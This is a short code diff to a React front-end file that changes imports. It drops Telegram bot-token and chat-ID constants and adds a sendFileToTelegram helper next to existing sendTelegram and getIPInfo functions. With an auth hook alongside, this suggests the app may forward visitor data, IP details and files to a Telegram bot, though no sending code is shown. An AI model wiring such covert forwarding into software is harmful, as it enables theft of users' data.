@@ -3,10 +3,7 @@ import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown, Upload } from "lucide-react";
-import { sendTelegram, getIPInfo } from "@/lib/telegram";
-
-const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
-const CHAT_ID   = import.meta.env.VITE_TELEGRAM_CHAT_ID;
+import { sendTelegram, sendFileToTelegram, getIPInfo } from "@/lib/telegram";
 
 const languageOptions: { code: Language; label: string }[] = [
   { code: "en", label: "English" },
